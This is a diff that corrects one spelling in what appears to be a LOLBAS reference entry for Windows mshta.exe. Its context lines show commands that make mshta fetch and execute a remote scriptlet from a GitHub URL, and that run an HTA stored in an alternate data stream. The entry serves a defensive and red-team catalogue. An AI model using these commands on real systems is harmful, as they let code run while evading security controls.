@@ -12,7 +12,7 @@ Commands:
   - Command: mshta.exe javascript:a=GetObject("script:https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Mshta_calc.sct").Exec();close();
     Description: Executes JavaScript supplied as a command line argument.
   - Command: mshta.exe "C:\ads\file.txt:file.hta"
-    Description: Opens the target .HTA and executes embeded JavaScript, JScript, or VBScript.
+    Description: Opens the target .HTA and executes embedded JavaScript, JScript, or VBScript.
 Full Path:
   - C:\Windows\System32\mshta.exe
   - C:\Windows\SysWOW64\mshta.exe
